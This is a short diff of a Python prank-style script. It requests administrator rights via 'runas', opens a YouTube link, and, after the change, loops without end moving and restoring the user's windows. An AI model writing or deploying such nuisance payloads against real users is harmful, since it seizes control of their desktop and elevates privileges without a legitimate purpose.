@@ -33,7 +33,9 @@ def Payload1():
     webbrowser.open("https://www.youtube.com/watch?v=qt5597kUtW8")
 
 def Payload2():
-  for title in window_titles:
+  while True:
+    window_titles = get_window_titles()
+    for title in window_titles:
         restore_minimized_windows()
         window_titles = get_window_titles()
         hwnd = win32gui.FindWindow(None, title)
@@ -45,7 +47,6 @@ def move_window(hwnd, x, y):
 
 if __name__ == "__main__":
   ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
-  window_titles = get_window_titles()
   timer_thread = threading.Thread(target=Payload1)
   timer_thread.start()
   timer_thread2 = threading.Thread(target=Payload2)
